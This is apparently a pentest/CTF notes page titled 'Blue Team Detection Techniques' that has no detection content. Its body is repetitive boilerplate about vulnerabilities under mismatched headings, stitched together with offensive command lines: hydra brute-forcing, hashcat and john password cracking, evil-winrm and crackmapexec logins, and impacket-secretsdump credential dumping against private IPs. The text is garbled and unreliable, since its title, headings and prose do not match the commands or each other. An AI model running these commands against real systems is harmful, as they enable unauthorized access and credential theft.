---
TitleSEO: "Blue Team Detection Techniques | ZureFX"
TitlePost: "Blue Team Detection Techniques"
Author: "ZureFX"
Description: "Personal notes on Blue Team Detection Techniques. Quick reference for pentesting and CTF challenges."
Keywords: "persistence, malware, dfir, linux"
URL: "https://zurefx.github.io/notes/note-blue-team-detection-techniques-385.html"
URL_IMAGES: ""
Date: "2024-12-25"
Tags: "Persistence, Malware, DFIR, Linux"
Section: "notes"
Lang: "en"
main_img: "note-blue-team-detection-techniques-385"
Permalink: "/notes/note-blue-team-detection-techniques-385.html"
BtnLabel: "Read Notes"
Pick: 0
---
## secretsdump

### Cron Job

The application stored sensitive credentials in an unencrypted configuration file. The database credentials were hardcoded in the application source code. The service account had excessive permissions assigned in Active Directory. Privilege escalation was possible due to misconfigured sudo permissions.

Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

The service account had excessive permissions assigned in Active Directory. The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service. Group Policy Preferences contained encrypted but recoverable credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
evil-winrm -i 10.40.36.6 -u administrator -p 'P@ssw0rd!'
```

## AS-REP Roasting

### MongoDB

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.32.242.99 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.83.187.222/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.32.179.129
```

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.12.87.53 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

- `GetUserSPNs`
- `ACL Abuse`
- `DNS Rebinding`
- `LAPS Abuse`
- `ligolo-ng`
- `bloodhound`

Post-exploitation enumeration revealed a path to domain administrator privileges. The kernel version was outdated and vulnerable to a publicly known exploit. The service account had excessive permissions assigned in Active Directory.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.106.19.140
```

## smbexec

### psexec

The backup files contained sensitive information that should not have been accessible. The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges. Post-exploitation enumeration revealed a path to domain administrator privileges. Group Policy Preferences contained encrypted but recoverable credentials.

- `atexec`
- `SUID Binary`
- `impacket`
- `GPP Password`
- `crackmapexec`

```python
gobuster dir -u http://10.36.210.107/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.21.93.171 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.46.39.48/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## dcomexec

### sharphound

> **Note:** Writable PATH was identified as the primary attack vector in this scenario.

The web application was vulnerable to Server-Side Template Injection (SSTI). Initial enumeration revealed several interesting open ports on the target. Weak file permissions allowed modification of critical system files. Post-exploitation enumeration revealed a path to domain administrator privileges.

- `Path Traversal`
- `GetNPUsers`
- `wpscan`
- `rpcclient`
- `crackmapexec`
- `ACL Abuse`

Group Policy Preferences contained encrypted but recoverable credentials. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
crackmapexec smb 10.125.183.178 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p110,25,110 10.32.87.176 -oN scan.txt
crackmapexec smb 10.51.178.65 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.129.240.235/FUZZ
```

## Bash

### AlwaysInstallElevated

The kernel version was outdated and vulnerable to a publicly known exploit. Unconstrained delegation was enabled on the compromised machine.

Authentication bypass was achieved through careful manipulation of the login mechanism. Unconstrained delegation was enabled on the compromised machine. The kernel version was outdated and vulnerable to a publicly known exploit. Command injection was possible through unsanitized user input in the search functionality. The kernel version was outdated and vulnerable to a publicly known exploit.

## GetNPUsers

### hydra

Weak file permissions allowed modification of critical system files. The service was running without proper input validation, leading to injection vulnerabilities. Command injection was possible through unsanitized user input in the search functionality.

Token impersonation allowed elevation to SYSTEM privileges on the target. Command injection was possible through unsanitized user input in the search functionality.

Weak file permissions allowed modification of critical system files. The target system was identified as running a vulnerable version of the service. The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

The service was running without proper input validation, leading to injection vulnerabilities. The kernel version was outdated and vulnerable to a publicly known exploit. Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory.
